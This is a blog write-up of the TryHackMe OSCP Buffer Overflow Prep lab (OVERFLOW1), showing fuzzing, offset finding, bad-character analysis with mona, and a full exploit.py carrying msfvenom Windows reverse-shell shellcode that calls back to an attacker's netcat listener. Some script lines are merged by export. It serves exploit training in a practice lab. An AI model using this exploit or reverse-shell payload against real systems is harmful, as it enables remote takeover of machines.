---
title: "TryHackMe  OSCP Buffer Overflow Prep  OVERFLOW 1  9d134d15a8cb"
platform: Medium
original_file: 2024-08-15_TryHackMe--OSCP-Buffer-Overflow-Prep--OVERFLOW-1--9d134d15a8cb.md
---

# TryHackMe  OSCP Buffer Overflow Prep  OVERFLOW 1  9d134d15a8cb

::: {}
# TryHackMe: OSCP Buffer Overflow Prep (OVERFLOW 1) {#tryhackme-oscp-buffer-overflow-prep-overflow-1 .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://www.tryhackme.com/room/bufferoverflowprep Note: This
room is Free
:::

:::::::: {.section .e-content field="body"}
::::::: {#8af5 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

::::: section-content
:::: {.section-inner .sectionLayout--insetColumn}
### TryHackMe: OSCP Buffer Overflow Prep (OVERFLOW 1) {#551b .graf .graf--h3 .graf--leading .graf--title name="551b"}

<figure id="d520" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/1*7KYfljKlgOU2T3ErGUFbAw.png"
class="graf-image" data-image-id="1*7KYfljKlgOU2T3ErGUFbAw.png"
data-width="2240" data-height="1260" data-is-featured="true" />
</figure>

**Room link:**
[**https://www.tryhackme.com/room/bufferoverflowprep**](https://www.tryhackme.com/room/bufferoverflowprep){.markup--anchor
.markup--p-anchor
data-href="https://www.tryhackme.com/room/bufferoverflowprep"
rel="noopener ugc nofollow noopener" target="_blank"}**\
Note: This room is Free**

### Definitions: {#6bfc .graf .graf--h3 .graf-after--p name="6bfc"}

1.  [**EIP =\>**The Extended Instruction Pointer (EIP) is a register
    that contains the address of the next instruction for the program or
    command.]{#54a3}
2.  [**ESP=\>**The Extended Stack Pointer (ESP) is a register that lets
    you know where on the stack you are and allows you to push data in
    and out of the application.]{#37ca}
3.  [**JMP =\>**The Jump (JMP) is an instruction that modifies the flow
    of execution where the operand you designate will contain the
    address being jumped to.]{#fe8c}
4.  [**\\x41, \\x42, \\x43 =\>**The hexadecimal values for A, B and C.
    For this exercise, there is no benefit to using hex vs ascii, it's
    just my personal preference.]{#e01e}

### OVERFLOW #1 {#bae6 .graf .graf--h3 .graf-after--li name="bae6"}

Okay, right now we should run our Immunity Debugger as Administrator and
open the oscp.exe.

<figure id="cdcd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*fZERheaA8v86LSYn.png"
class="graf-image" data-image-id="0*fZERheaA8v86LSYn.png"
data-width="653" data-height="391" />
</figure>

The application will be loaded into the debugger in the "Paused" state.
click Red play button on the upper bar within Immunity Debugger.

Ensure the exe is running by checking the status in the lower right of
Immunity Debugger.

<figure id="6fff" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*7jlNJ3Adh0bMSYNV.png"
class="graf-image" data-image-id="0*7jlNJ3Adh0bMSYNV.png"
data-width="310" data-height="215" />
</figure>

To check we can NC to target machine with port 1337.

<figure id="c189" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*nkdmIieQzTEXOXHU.png"
class="graf-image" data-image-id="0*nkdmIieQzTEXOXHU.png"
data-width="546" data-height="394" />
</figure>

Set the working folder within mona.

::: {#156e .graf .graf--mixtapeEmbed .graf-after--p}
[**GitHub - corelan/mona: Corelan Repository for mona.py**\
*Corelan Repository for mona.py. Contribute to corelan/mona development
by creating an account on
GitHub.*github.com](https://github.com/corelan/mona?source=post_page-----19e000482f27-------------------------------- "https://github.com/corelan/mona?source=post_page-----19e000482f27--------------------------------"){.markup--anchor
.markup--mixtapeEmbed-anchor
data-href="https://github.com/corelan/mona?source=post_page-----19e000482f27--------------------------------"}[](https://github.com/corelan/mona?source=post_page-----19e000482f27--------------------------------){.js-mixtapeImage
.mixtapeImage .u-ignoreBlock media-id="005c4f5ccf067897ed32f0fe0ae91e33"
thumbnail-img-id="0*Jyr4Y9arRYQXL3kq"
style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*Jyr4Y9arRYQXL3kq);"}
:::

Download mona.py and paset into C:\\Program Files (x86)\\Immunity
Inc\\Immunity Debugger\\PyCommands

``` {#1abd .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
!mona config -set workingfolder c:\mona\%p
```

<figure id="7811" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*S199gP66mHT-s2S7.png"
class="graf-image" data-image-id="0*S199gP66mHT-s2S7.png"
data-width="419" data-height="185" />
</figure>

Let's try to run fuzzer.py (get from the room) and see the results. Just
check whether the IP inside the script is correct and make sure to run
again the oscp.exe in Immunity Debugger before running the script.

### Fuzzer.py {#5f5a .graf .graf--h3 .graf-after--p name="5f5a"}

``` {#a7d8 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="lua"}
import socket, time, sysip = "192.168.43.57";
port = 1337
timeout = 5buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

Also copy the **exploit.py** code

``` {#8196 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="makefile"}
import socketip = "192.168.43.57"
port = 1337prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""buffer = prefix + overflow + retn + padding + payload + postfixs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Click on Red play button , and Kick off the fuzzer.py against the target
IP

<figure id="ed6e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*QBVRT5y2aIfOLn_9.png"
class="graf-image" data-image-id="0*QBVRT5y2aIfOLn_9.png"
data-width="412" data-height="453" />
</figure>

If you can see it stop at 2000 bytes which means the offset would be in
the range of 1900 to 2000 bytes. Let's create a pattern more than our
offset around 400 bytes which would be 2400 bytes. to crashed our
program

<figure id="908f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*BqZAJjZO3xl2Ejtp.png"
class="graf-image" data-image-id="0*BqZAJjZO3xl2Ejtp.png"
data-width="656" data-height="281" />
</figure>

above image you can see that EIP is overwritten with A(hex=41)

so we need to find the exact address where the program is crashed

Now generate a pattern, based on the length of bytes to crash the
server.

``` {#456f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
msf-pattern_create -l 2400
```

<figure id="a106" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*q7tcWMdj9OElUKjd.png"
class="graf-image" data-image-id="0*q7tcWMdj9OElUKjd.png"
data-width="859" data-height="440" />
</figure>

So copy the payload and put it into the payload variable in exploit.py
and try to run it. The script should crash the oscp.exe server again.

<figure id="5e75" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*cN4CzCvCWdIrbFqP.png"
class="graf-image" data-image-id="0*cN4CzCvCWdIrbFqP.png"
data-width="739" data-height="622" />
</figure>

Ensure oscp.exe is running within Immunity Debugger. Execute exploit.py
against the target.

<figure id="0182" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*HKZL-B7UCVFZWAvN.png"
class="graf-image" data-image-id="0*HKZL-B7UCVFZWAvN.png"
data-width="406" data-height="96" />
</figure>

<figure id="02c7" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*qihOG_aBav_upmBt.png"
class="graf-image" data-image-id="0*qihOG_aBav_upmBt.png"
data-width="665" data-height="231" />
</figure>

in the above image We have EIP=6F43396E

### Find Offset Value {#7995 .graf .graf--h3 .graf-after--p name="7995"}

<figure id="6635" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*ePckfxti7WflS0nH.png"
class="graf-image" data-image-id="0*ePckfxti7WflS0nH.png"
data-width="433" data-height="74" />
</figure>

offset value is 1978

**Another Method** to find Offset value using mona module

Try running the following mona command in immunity:

``` {#58ac .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
!mona findmsp -distance 2400
```

<figure id="8160" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*BiRDoomqLm8OxqAt.png"
class="graf-image" data-image-id="0*BiRDoomqLm8OxqAt.png"
data-width="719" data-height="429" />
</figure>

So look for the line said EIP contains normal pattern :0x76413176
(offset 1978). the offset we found in the offset variable and set the
retn variable to BBBB.

Update the offset and the retn variable

<figure id="cb6b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*s6By_Xh1N8XZL16E.png"
class="graf-image" data-image-id="0*s6By_Xh1N8XZL16E.png"
data-width="586" data-height="327" />
</figure>

Restart the .exe in Immunity Debugger with Ctrl+F2 and F9 to run.
Execute the exploit.py. If the offset is correct we should see
"42424242" \<- the B's at the EIP.

Let's run it again.

<figure id="62e2" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*jZVyL1ZrviIiQNX4.png"
class="graf-image" data-image-id="0*jZVyL1ZrviIiQNX4.png"
data-width="406" data-height="96" />
</figure>

<figure id="18b3" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*GvuQjygvTu0lHRVN.png"
class="graf-image" data-image-id="0*GvuQjygvTu0lHRVN.png"
data-width="668" data-height="346" />
</figure>

As we can see the EIP Register is Overwritten with BBBB or 42424242. So
far everything went well.

Take note of the ESP address because we will be using the values in this
position in future step

### Find Badchars {#47be .graf .graf--h3 .graf-after--p name="47be"}

Now we need to find the BADCHARS- For which we create BADCHARS, on set
inside the machine using MONA and another by just googling or using a
python script.By default \\x00 is considered as a BADCHAR so it is to be
neglected for sure. This helps us to identify the characters which are
really BAD for our program!

Generate a bytearray using mona, and exclude the null byte (\\x00) by
default.

Use this mona commands.

``` {#e3c6 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00"
```

<figure id="9330" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*saz-ehAjankNqRca.png"
class="graf-image" data-image-id="0*saz-ehAjankNqRca.png"
data-width="875" data-height="247" />
</figure>

Now we need to generate a string of bad chars from \\x01 to \\xff that
is identical to the bytearray. Use the python script

``` {#e398 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="scss"}
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

<figure id="0318" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*3C1KlNyCdAXfa_wA.png"
class="graf-image" data-image-id="0*3C1KlNyCdAXfa_wA.png"
data-width="806" data-height="252" />
</figure>

This generated string has already removed the \\x00 so we need to remove
that from the .bin with mona.

Copy the new generated string into the payload variable in the
exploit.py

<figure id="726f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*COPKwuZlh2sGe4Sv.png"
class="graf-image" data-image-id="0*COPKwuZlh2sGe4Sv.png"
data-width="812" data-height="351" />
</figure>

Run the script and take note of the address to which the ESP register
points

<figure id="619f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*9fL9P51y3SXcEhor.png"
class="graf-image" data-image-id="0*9fL9P51y3SXcEhor.png"
data-width="406" data-height="96" />
</figure>

<figure id="10b5" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Vn4wxqWHPPpAmKdp.png"
class="graf-image" data-image-id="0*Vn4wxqWHPPpAmKdp.png"
data-width="675" data-height="350" />
</figure>

Right click on ESP Value and Follow in dump

<figure id="58a9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ZfBiZ9ozMthWBdQg.png"
class="graf-image" data-image-id="0*ZfBiZ9ozMthWBdQg.png"
data-width="400" data-height="213" />
</figure>

in the above image the sequence has been changed after 06 that means
there are some badchar in over payload lets find out badchars

Use it in the following mona command

**Note:-** Maybe your ESP address is different

``` {#4b79 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 00DCFA28
```

<figure id="c472" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Olf-Sn8suk_XR4om.png"
class="graf-image" data-image-id="0*Olf-Sn8suk_XR4om.png"
data-width="875" data-height="360" />
</figure>

Possible bad chars

So we found a list of possible bad chars
**`07 08 2e 2f a0 a1`{.markup--code .markup--p-code}**

Not all of these might be bad chars! Sometimes bad chars cause the next
byte to get corrupted as well, or even affect the rest of the string.

At this point I start removing the bad characters one at a time. I
removed one bad character at a time by repeating the following steps:

- [Remove character from byte array]{#b385}
- [Remove character from exploit payload]{#9f2e}
- [Start exe]{#92c3}
- [Compare using mona]{#b7d0}

Start oscp.exe in immunity,

So i created a new bytearray and removed \\x07 from the payload too

``` {#0e2a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x07"
```

run server

Edit exploit.py remove \\x07 from payload variable and run exploit.py

``` {#fb1d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
#python exploit.py
```

check ESP Pointer value

<figure id="fbcb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*dw8u3ppZnfLASBfJ.png"
class="graf-image" data-image-id="0*dw8u3ppZnfLASBfJ.png"
data-width="385" data-height="227" />
</figure>

``` {#88a6 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 00EFFA28(ESP)
```

<figure id="2b06" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*WSXLM4iXnouZjNF4.png"
class="graf-image" data-image-id="0*WSXLM4iXnouZjNF4.png"
data-width="652" data-height="374" />
</figure>

As a hint by the immunity debugger the possible BADCHARS now were x2e
\\x2f \\xa0 \\xa1. That means a BADCHAR made its adjacent byte too a
BADCHAR which want BAD by default

start oscp.exe in immunity

So i created a new bytearray and removed \\x2e from the payload too

``` {#3ae8 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona bytearray -b "\x00\x07\x2e"
```

run server

Edit exploit.py remove \\x2e from payload variable and run exploit.py

``` {#29b0 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
#python exploit.py
```

check ESP Pointer value

<figure id="8ae8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*BLmc-X8V9RkRGNX7.png"
class="graf-image" data-image-id="0*BLmc-X8V9RkRGNX7.png"
data-width="669" data-height="306" />
</figure>

``` {#37a4 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 0080FA28
```

<figure id="fa25" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*U6VThIhywwWrGCmF.png"
class="graf-image" data-image-id="0*U6VThIhywwWrGCmF.png"
data-width="506" data-height="228" />
</figure>

and again it was the same case x2e was a BADCHAR was x2f wasn't one.

Now we had only two apparent BADCHARS \\xa0 \\xa1

start oscp.exe in immunity

So i created a new bytearray and removed \\xa0 from the payload too

``` {#6fc8 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
!mona bytearray -b “\x00\x07\x2e\xa0”
```

run server

Edit exploit.py remove \\xa0 from payload variable and run exploit.py

``` {#351f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
#python exploit.py
```

check ESP Pointer value

<figure id="5e58" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ALMPrk8m-gcCXGgh.png"
class="graf-image" data-image-id="0*ALMPrk8m-gcCXGgh.png"
data-width="518" data-height="307" />
</figure>

``` {#98bf .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
!mona compare -f C:\mona\oscp\bytearray.bin -a 00C3FA28
```

<figure id="a6e0" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*_zml5pa_e81RIo_i.png"
class="graf-image" data-image-id="0*_zml5pa_e81RIo_i.png"
data-width="767" data-height="385" />
</figure>

After this! WE FIRE IT and run the comparison in MONA, we find the
address unmodified now. BOOM so finally we got our BADCHARS

got error unmodified

And after try and error, the sequence is like this.

<figure id="bd06" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*82-PxATh0-Rxjvzu.png"
class="graf-image" data-image-id="0*82-PxATh0-Rxjvzu.png"
data-width="670" data-height="117" />
</figure>

Green Box means correct bad chars

Let's find the jump point using the mona command again:

``` {#a7db .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```

<figure id="638b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*1NeQpmx0tMpJX7om.png"
class="graf-image" data-image-id="0*1NeQpmx0tMpJX7om.png"
data-width="652" data-height="256" />
</figure>

Any of the addresses from the results above may be used as the retn
value in the exploit. Little endian = Reverse. Also add padding to allow
the payload to unpack.

Note the address **625011AF**

Update our retn variable with the new address and must be written
backward (since the system is little-endian=Reverse).

``` {#51b3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ini"}
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
```

<figure id="f83f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*nTIzaUqRmqOzH4Gh.png"
class="graf-image" data-image-id="0*nTIzaUqRmqOzH4Gh.png"
data-width="522" data-height="212" />
</figure>

Now generate the reverse shell payload using msfvenom.

``` {#c509 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.73 LPORT=4444 EXITFUNC=thread -b “\x00\x07\x2e\xa0” -f c
```

<figure id="5281" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*kcSrVYA_1b6RsWFE.png"
class="graf-image" data-image-id="0*kcSrVYA_1b6RsWFE.png"
data-width="823" data-height="439" />
</figure>

Copy the payload into the exploit.py

<figure id="2da5" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*dZ8ZuYlgZWk6Uc_u.png"
class="graf-image" data-image-id="0*dZ8ZuYlgZWk6Uc_u.png"
data-width="875" data-height="470" />
</figure>

so the final payload is this for My Kali

``` {#daee .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="swift"}
import socketip = "192.168.43.57"
port = 1337
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xba\xba\x45\x54\xb0\xdb\xc3\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\x54\xb9\xb6\x45\x54\xaa\xb5"
"\xa6\xa4\x2b\xda\x2f\x41\x1a\xda\x54\x02\x0d\xea\x1f\x46\xa2"
"\x81\x72\x72\x31\xe7\x5a\x75\xf2\x42\xbd\xb8\x03\xfe\xfd\xdb"
"\x87\xfd\xd1\x3b\xb9\xcd\x27\x3a\xfe\x30\xc5\x6e\x57\x3e\x78"
"\x9e\xdc\x0a\x41\x15\xae\x9b\xc1\xca\x67\x9d\xe0\x5d\xf3\xc4"
"\x22\x5c\xd0\x7c\x6b\x46\x35\xb8\x25\xfd\x8d\x36\xb4\xd7\xdf"
"\xb7\x1b\x16\xd0\x45\x65\x5f\xd7\xb5\x10\xa9\x2b\x4b\x23\x6e"
"\x51\x97\xa6\x74\xf1\x5c\x10\x50\x03\xb0\xc7\x13\x0f\x7d\x83"
"\x7b\x0c\x80\x40\xf0\x28\x09\x67\xd6\xb8\x49\x4c\xf2\xe1\x0a"
"\xed\xa3\x4f\xfc\x12\xb3\x2f\xa1\xb6\xb8\xc2\xb6\xca\xe3\x8a"
"\x7b\xe7\x1b\x4b\x14\x70\x68\x79\xbb\x2a\xe6\x31\x34\xf5\xf1"
"\x36\x6f\x41\x6d\xc9\x90\xb2\xa4\x0e\xc4\xe2\xde\xa7\x65\x69"
"\x1e\x47\xb0\x3e\x4e\xe7\x6b\xff\x3e\x47\xdc\x97\x54\x48\x03"
"\x87\x57\x82\x2c\x22\xa2\x45\x93\x1b\xad\x1b\x7b\x5e\xad\x32"
"\x20\xd7\x4b\x5e\xc8\xb1\xc4\xf7\x71\x98\x9e\x66\x7d\x36\xdb"
"\xa9\xf5\xb5\x1c\x67\xfe\xb0\x0e\x10\x0e\x8f\x6c\xb7\x11\x25"
"\x18\x5b\x83\xa2\xd8\x12\xb8\x7c\x8f\x73\x0e\x75\x45\x6e\x29"
"\x2f\x7b\x73\xaf\x08\x3f\xa8\x0c\x96\xbe\x3d\x28\xbc\xd0\xfb"
"\xb1\xf8\x84\x53\xe4\x56\x72\x12\x5e\x19\x2c\xcc\x0d\xf3\xb8"
"\x89\x7d\xc4\xbe\x95\xab\xb2\x5e\x27\x02\x83\x61\x88\xc2\x03"
"\x1a\xf4\x72\xeb\xf1\xbc\x93\x0e\xd3\xc8\x3b\x97\xb6\x70\x26"
"\x28\x6d\xb6\x5f\xab\x87\x47\xa4\xb3\xe2\x42\xe0\x73\x1f\x3f"
"\x79\x16\x1f\xec\x7a\x33")postfix = ""buffer = prefix + overflow + retn + padding + payload + postfixs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(buffer + "\r\n")
  print("Done!")
except:
  print("Could not connect.")
```

Start up a listener with netcat

<figure id="83c7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Lh6t4JEwKOpP_kkW.png"
class="graf-image" data-image-id="0*Lh6t4JEwKOpP_kkW.png"
data-width="333" data-height="101" />
</figure>

Start the vulnerable application again. Execute exploit.py. Now looking
back at netcat.

<figure id="25d6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*URV64G3iGqC4Q46E.png"
class="graf-image" data-image-id="0*URV64G3iGqC4Q46E.png"
data-width="428" data-height="146" />
</figure>

<figure id="1543" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*LnDu78trNzVZ-FN0.png"
class="graf-image" data-image-id="0*LnDu78trNzVZ-FN0.png"
data-width="678" data-height="260" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#14fd .graf .graf--h3 .graf-after--figure name="14fd"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#7188 .graf .graf--h3 .graf-after--p name="7188"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
::::
:::::
:::::::
::::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 15, 2024](https://medium.com/p/9d134d15a8cb).

[Canonical
link](https://medium.com/@bevijaygupta/tryhackme-oscp-buffer-overflow-prep-overflow-1-9d134d15a8cb){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
